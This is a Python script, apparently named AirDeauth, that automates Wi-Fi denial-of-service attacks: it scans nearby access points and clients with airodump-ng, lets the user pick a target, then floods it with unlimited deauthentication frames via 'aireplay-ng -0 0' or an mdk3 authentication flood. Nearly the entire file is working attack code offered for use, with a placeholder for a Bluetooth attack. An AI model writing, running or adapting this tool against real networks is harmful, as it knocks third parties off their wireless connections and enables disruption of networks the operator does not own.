import re
import subprocess
import os
import time
import sys
import csv
import shlex

AD_PREFIX = "[AirDeauth] "
AD_WELCOME = AD_PREFIX + "Deauthentication attack is a type of denial-of-service attack that targets communication between a user (potentially all users) and a Wi-Fi wireless access point."
AD_CSV_NAME = "airodump_data"

WIFI_INTERFACE = "wlx00c0ca988da1"

# Maximum length of columns returned by airodump-ng
BSSID_INDEX = 0
BSSID_STR_LENGTH = 18
CHANNEL_INDEX = 3
CHANNEL_STR_LENGTH = 3
PRIVACY_INDEX = 5
PRIVACY_STR_LENGTH = 10
CIPHER_INDEX = 6
CIPHER_STR_LENGTH = 12
AUTH_INDEX = 7
AUTH_STR_LENGTH = 4
POWER_INDEX = 8
POWER_STR_LENGTH = 3
ESSID_INDEX = 13
ESSID_STR_LENGTH = 26

BLACK_LIST = "black_list.txt"

class AccessPoint():
    def __init__(self, id, row):
        if id == 0:
            self.index = "Id"
            self.channel = "Chan"
            self.auth = "Auth"
            self.power = "Pwr"
        else:
            self.index = str(id)
            self.channel = row[CHANNEL_INDEX]
            self.auth = row[AUTH_INDEX]
            self.power = row[POWER_INDEX]

        self.bssid = row[BSSID_INDEX]
        self.privacy = row[PRIVACY_INDEX]
        self.cipher = row[CIPHER_INDEX]
        self.essid = row[ESSID_INDEX]
        self.speed = 0

    def prt(self):
        if self.index == "Id":
            print((self.index + " |").ljust(5), end='')
        else:
            print(("%02d" % int(self.index) + " |").ljust(5), end='')
        print(self.essid.ljust(ESSID_STR_LENGTH),
            self.bssid.ljust(BSSID_STR_LENGTH),
            self.channel.ljust(CHANNEL_STR_LENGTH),
            self.privacy.ljust(PRIVACY_STR_LENGTH),
            self.cipher.ljust(CIPHER_STR_LENGTH),
            self.auth.ljust(AUTH_STR_LENGTH),
            self.power.ljust(POWER_INDEX))

class Station():
    def __init__(self, id, row):
        if id == 0:
            self.index = "Id"
            self.power = "Pwr"
        else:
            self.index = str(id)
            self.power = row[3]

        self.mac = row[BSSID_INDEX]
        self.bssid = row[5]
        self.essid = row[6]

    def prt(self):
        if self.index == "Id":
            print((self.index + " |").ljust(5), end='')
        else:
            print(("%02d" % int(self.index) + " |").ljust(5), end='')
        print(self.mac.ljust(BSSID_STR_LENGTH),
                self.power.ljust(CHANNEL_STR_LENGTH),
                self.bssid.ljust(BSSID_STR_LENGTH + 2),
                self.essid.ljust(ESSID_STR_LENGTH))

class AirDeauth():
    def __init__(self):
        self.welcome()
        self.interface = ""
        self.monitor = ""
        self.ap_list = []
        self.stations_list = []
        self.current_ap_index = 0

    def welcome(self):
        print(AD_WELCOME)
        print(AD_PREFIX + "Which attack do you choose?")
        print(AD_PREFIX + "1/ Deauthentification attack with aireplay-ng")
        print(AD_PREFIX + "2/ Deauthentification attack with mdk4")
        print(AD_PREFIX + "3/ Bluetooth attack")
        print(AD_PREFIX + "4/ Exit")
        print(AD_PREFIX)
        self.attack_mode = int(input(AD_PREFIX + "> "))

    def get_interface(self):
        self.interface = WIFI_INTERFACE

    def get_ap(self):
        csvfile = open(AD_CSV_NAME + "-01.csv")
        csv_reader = csv.reader(csvfile, delimiter=',')
        line_count = 0
        index = 0
        ap_shows = 0

        for row in csv_reader:
            if line_count == 0:
                pass
            else:
                try:
                    if ap_shows == 0:
                        ap = AccessPoint(index, row)
                        air_deauth.add_ap(ap)
                    else:
                        station = Station(index, row)
                        air_deauth.add_station(station)
                    index += 1
                except:
                    if ap_shows == 1:
                        print("")
                        break
                    ap_shows = 1
                    index = 0
                    print("")
                    pass
                line_count += 1
            line_count += 1


    def add_ap(self, ap):
        self.ap_list.append(ap)

    def add_station(self, station):
        self.stations_list.append(station)

    def show_ap(self):
        print("")
        print(AD_PREFIX + str(len(self.ap_list)) + " access point found:\n")
        for ap in self.ap_list:
            ap.prt()

    def show_stations(self):
        print("")
        print(AD_PREFIX + str(len(self.stations_list)) + " stations found:\n")
        for station in self.stations_list:
            station.prt()

    def remove_ap(self):
        self.ap_list = []

    def remove_stations(self):
        self.stations_list = []

    def select_ap(self):
        ap_id = input(AD_PREFIX + "Select access point id to attack > ")
        self.current_ap = self.ap_list[int(ap_id)]
        f = open(BLACK_LIST, "w")
        f.write(self.current_ap.bssid)
        f.close()
        print(AD_PREFIX + "Starting attack on: " + self.current_ap.essid + " (" + self.current_ap.bssid + ")")

    def start_deauth(self):
        self.start_airodump_ng(full_scan=True)
        while True:
            try:
                self.remove_ap()
                self.remove_stations()
                self.get_ap()
                os.system("clear")
                self.show_ap()
                self.show_stations()
                time.sleep(2)
            except KeyboardInterrupt:
                break
        self.stop_airodump_ng()
        self.select_ap()
        if self.attack_mode == 1:
            self.start_airodump_ng(full_scan=False)
            self.start_aireplay_ng()
            self.stop_airodump_ng()
        else:
            self.start_mdk4()
        print(AD_PREFIX + "Success!")

    '''
    ' Functions belows use aircrack-ng and airodump-ng.
    '''

    # Turn self.interface to monitor or managed mode:
    def set_interface_mode(self, mode="Monitor"):
        try:
            os.system("ifconfig " + self.interface + " down")
            os.system("iwconfig " + self.interface + " mode " + mode)
            os.system("ifconfig " + self.interface + " up")
            print(AD_PREFIX + "Set " + self.interface + " to " + mode + " mode.")
        except:
            print(AD_PREFIX + "Failed to set " + self.interface + " to " + mode + " mode.")

    def start_airodump_ng(self, full_scan=False):
        try:
            if full_scan == False:
                cmd = "airodump-ng -c " + self.current_ap.channel + " --bssid " + self.current_ap.bssid + " -w " + AD_CSV_NAME + " --output-format csv " + self.interface
            else:
                cmd = "airodump-ng -w " + AD_CSV_NAME + " --output-format csv " + self.interface
                print(AD_PREFIX + "Starting airodump-ng full scan.")
            args = shlex.split(cmd)
            self.airodump_process = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(4)
            print(AD_PREFIX + "Airodump-ng started.")
            time.sleep(1)
        except KeyboardInterrupt:
            print(WD_PREFIX + "Exiting Airodump...")

    def stop_airodump_ng(self):
        self.airodump_process.terminate()
        print(AD_PREFIX + "Airodump-ng stopped.")
        self.remove_airodump_data()

    def start_aireplay_ng(self):
        try:
            print(AD_PREFIX + "Aireplay-ng started.")
            #os.system("aireplay-ng -0 0 -a " + self.current_ap.bssid + " -c " + self.current_station.mac + " " + self.interface)
            os.system("aireplay-ng -0 0 -a " + self.current_ap.bssid + " " + self.interface)
        except:
            print(AD_PREFIX + "Failed to start aireplay-ng.")

    def start_mdk4(self):
        try:
            #mdk4 = "mdk4 " + self.interface + " d " + " -c " + self.current_ap.channel + " -B " + self.current_ap.bssid
            #mdk4 = "mdk4 " + self.interface + " b " + " -n " + self.current_ap.bssid
            mdk4 = "mdk3 " + self.interface + " a -a " + self.current_ap.bssid
            print(AD_PREFIX + "Starting mdk4: " + mdk4)
            os.system(mdk4)
            print(AD_PREFIX + "Mdk4 started.")
        except:
            print(AD_PREFIX + "Failed to start mdk4.")

    def remove_airodump_data(self):
        try:
            os.system("rm airodump_data*")
            print(AD_PREFIX + "Airodump_data files deleted.")
            time.sleep(1)
        except:
            print(AD_PREFIX + "Failed to remove airodump_data files.")

if __name__ == "__main__":
    air_deauth = AirDeauth()
    if air_deauth.attack_mode <= 2:
        air_deauth.get_interface()
        air_deauth.set_interface_mode(mode="monitor")
        air_deauth.start_deauth()
        air_deauth.set_interface_mode(mode="managed")
    elif air_deauth.attack_mode == 3:
        print(AD_PREFIX + "Bluetooth attack in development.")
    else:
        exit()
